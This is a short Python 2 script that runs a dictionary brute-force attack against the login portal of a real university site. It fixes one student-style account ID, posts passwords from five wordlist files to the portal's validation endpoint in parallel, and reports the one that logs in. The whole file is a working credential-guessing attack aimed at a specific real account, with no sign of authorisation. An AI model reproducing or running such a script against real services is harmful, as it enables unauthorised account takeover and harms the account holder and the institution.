# coding=utf-8
import os
import time
import requests
import re
import gevent
from gevent import monkey; monkey.patch_socket()
from bs4 import BeautifulSoup as BS
from Queue import Queue

def payloads(f): 
	userkey = 'Login.Token1'
	userv = '2015223030087'
	passkey = 'Login.Token2'
	passv = 0
	goto = 'http://my.scu.edu.cn/loginSuccess.portal'
	gotoOnFail = 'http://my.scu.edu.cn/loginFailure.portal'

	payload = {}
	for line in f:
		passv = line[:-1]
		#print passv
		payload = {userkey:userv, passkey:passv, 'goto':goto, 'gotoOnFail':gotoOnFail}
		#print payload
		http(payload,passv)
	f.close()

def http(payload,passv):
	posturl = 'http://my.scu.edu.cn/userPasswordValidate.portal'
	res = requests.post(posturl,data=payload)
	soup = BS(res.text, "lxml")
	#print soup
	result = re.compile('handleLoginSuccessed')
	t1 = soup.find(text=result) 
	if t1:
		print 'password found:'+passv
		#q.put(passv)
		#f.close()
		print "end at " + time.ctime()
		exit()
		#break
	else:
		print passv + ' is not the password...continue...'
	#f.close()
    
def main():

	#q = Queue()
	#result = []
	f1 = open("F:\dict1.txt")
	f2 = open("F:\dict2.txt")
	f3 = open("F:\dict3.txt")
	f4 = open("F:\dict4.txt")
	f5 = open("F:\dict5.txt")

	gevent.joinall([
        gevent.spawn(payloads, f1),
        gevent.spawn(payloads, f2),
		gevent.spawn(payloads, f3),
        gevent.spawn(payloads, f4),
		gevent.spawn(payloads, f5),
])

 
if __name__ == '__main__':
	print "begin at " + time.ctime()
	main()
	print "All finished. No password found, please make a more powerful dic. "
	print "end at " + time.ctime()